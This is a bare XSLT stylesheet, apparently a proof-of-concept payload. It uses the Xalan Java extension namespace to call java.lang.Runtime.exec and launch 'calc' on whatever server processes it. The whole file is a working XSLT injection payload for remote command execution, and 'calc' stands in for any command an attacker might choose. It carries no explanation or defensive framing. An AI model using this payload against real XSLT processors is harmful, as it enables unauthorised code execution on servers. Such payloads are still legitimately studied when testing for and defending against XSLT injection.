<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<xsl:template match="/"><xsl:variable name="r" select="rt:getRuntime()"/><xsl:value-of select="rt:exec($r, 'calc')"/></xsl:template>
</xsl:stylesheet>
